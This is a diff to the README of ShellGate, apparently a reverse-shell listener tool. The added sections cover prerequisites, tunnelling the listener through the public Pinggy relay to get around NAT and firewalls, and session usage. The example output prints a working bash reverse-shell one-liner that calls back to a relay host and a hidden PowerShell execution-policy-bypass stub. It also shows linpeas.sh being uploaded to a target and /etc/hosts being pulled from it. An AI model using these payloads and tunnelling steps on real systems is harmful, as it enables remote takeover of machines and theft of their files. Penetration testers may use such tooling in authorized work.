@@ -11,11 +11,13 @@
 ## Table of Contents
 
 - [Key Features](#key-features)
+- [Prerequisites](#prerequisites)
 - [Architecture](#architecture)
 - [How It Works Under the Hood](#how-it-works-under-the-hood)
 - [Installation](#installation)
 - [CLI Reference](#cli-reference)
 - [Usage Examples](#usage-examples)
+- [Pinggy Mode Guide & Examples](#pinggy-mode-guide--examples)
 - [Interactive Session Commands](#interactive-session-commands)
 - [Connection Matrix](#connection-matrix)
 - [Security & Input Hardening](#security--input-hardening)
@@ -93,6 +95,27 @@ During `:upload`, ShellGate computes the local SHA-256 digest before sending chu
 
 ---
 
+## Prerequisites
+
+### Operator Host (Listener Side)
+| Requirement | Mode | Details |
+| :--- | :--- | :--- |
+| **Python 3.10+** | All | Tested on Python 3.10–3.14 (Kali Linux, Ubuntu, macOS, Windows); zero third-party packages required |
+| **OpenSSH Client (`ssh`)** | `--mode pinggy` | Must be available in `PATH` (`ssh -V`) to open the outbound `tcp@free.pinggy.io:443` relay |
+| **Outbound TCP/443** | `--mode pinggy` | Operator machine must reach `free.pinggy.io` on port `443` (useful when inbound firewall/NAT blocks callbacks) |
+| **`iproute2` (`ip` CLI)** | `--mode local` | Optional on Linux for automatic interface IP lookup (`tun0`, `tap0`, `eth1`, `eth0`); falls back to UDP probe if absent |
+| **`pip` / `setuptools`** | Optional | Needed only for editable package install (`pip install --no-build-isolation --no-deps -e .`); `python3 -m shellgate` works without installing |
+
+### Target Host (Callback & Transfer Side)
+| Feature | Linux / macOS | Windows |
+| :--- | :--- | :--- |
+| **Fingerprinting** | `uname`, `whoami`, `hostname` | `ver`, `whoami`, `hostname` |
+| **`:upload` / `:download`** | `base64` (`-d` / `-D`), `printf`, `rm` | `certutil` (`-decode`, `-hashfile`), `powershell` (`[System.IO.File]`, `[Convert]::ToBase64String`) |
+| **SHA-256 Verification** | `sha256sum` or `shasum -a 256` *(gracefully degrades with `NO_HASH` if missing)* | `certutil -hashfile ... SHA256` |
+| **`:pty` Upgrade** | `python3` (`pty.spawn`) or `script` | Not applicable (native console I/O) |
+
+---
+
 ## Installation
 
 ```bash
@@ -147,6 +170,74 @@ shellgate --mode pinggy --port 8888
 # Explicit callback IP override
 shellgate --mode local --host 10.10.14.5 --port 9001
 ```
+
+---
+
+## Pinggy Mode Guide & Examples
+
+Pinggy exposes your local ShellGate TCP listener through a public `*.run.pinggy-free.link:<port>` endpoint over an outbound SSH connection to port `443` — ideal when testing from behind CGNAT, hotel/corporate Wi-Fi, or cloud VMs without inbound port forwarding.
+
+### 1. Pre-Flight Check
+Verify `ssh` is installed and outbound port `443` reaches Pinggy:
+
+```bash
+ssh -V
+ssh -p 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -T tcp@free.pinggy.io
+# Press Ctrl+C after confirming connection (no errors/timeouts)
+```
+
+### 2. Standard Pinggy Session (Default Port `8888`)
+```bash
+shellgate --mode pinggy --port 8888
+```
+
+Live output:
+```text
+--- SHELLGATE v2.0.0 (PINGGY) ---
+[Listener]: 0.0.0.0:8888 | [Endpoint]: tcp://fptsf-1-47-78-113.run.pinggy-free.link:40317 | [Sessions]: 0
+1. Payloads
+2. Sessions
+3. Exit
+
+> 1
+
+=== PAYLOADS (fptsf-1-47-78-113.run.pinggy-free.link:40317) ===
+
+[bash_tcp]
+bash -c 'bash -i >& /dev/tcp/fptsf-1-47-78-113.run.pinggy-free.link/40317 0>&1'
+
+[powershell_b64]
+powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ...
+```
+
+### 3. Hardened Loopback-Only Bind + Custom Port
+Bind locally to `127.0.0.1` so the listener is unreachable on your LAN and accepts traffic **only** via the Pinggy SSH tunnel:
+
+```bash
+shellgate --mode pinggy --bind 127.0.0.1 --port 9001
+```
+
+### 4. File Transfers Over Pinggy (Single-Tunnel Advantage)
+The free Pinggy TCP tier forwards **one TCP port per tunnel**. Because ShellGate's `:upload` and `:download` run inline over the active shell socket using split-marker Base64 framing, you do **not** need a second port or HTTP tunnel to transfer tools or artifacts:
+
+```text
+> 2
+Session ID: 1
+:upload ./linpeas.sh /tmp/linpeas.sh
+[*] Uploading chunk 85/85
+[+] Uploaded 84512 bytes (SHA-256 verified: 3c8a9e2b14d0...)
+
+:download /etc/hosts ./hosts_target.txt
+[+] Saved ./hosts_target.txt (248 bytes, SHA-256: 7b11c39f2a01...)
+```
+
+### 5. Pinggy Operational Notes & Troubleshooting
+| Symptom / Constraint | Cause & Fix |
+| :--- | :--- |
+| `[Endpoint]: WAITING...` or `FAILED` | Outbound TCP/443 to `free.pinggy.io` blocked by local firewall/proxy, or `ssh` missing in `PATH` |
+| Tunnel disconnects after ~60 minutes | Pinggy free-tier sessions expire after 60 minutes; restart `shellgate --mode pinggy` to obtain a fresh endpoint |
+| Target cannot connect to `*.run.pinggy-free.link:<port>` | Target environment restricts outbound egress to high dynamic TCP ports (`10000–65535`) — verify target DNS/egress |
+| Do not pair `--http-port` with `--mode pinggy` | Free Pinggy TCP mode forwards only `--port`; use inline `:upload`/`:download` instead of HTTP staging |
 
 ---
 
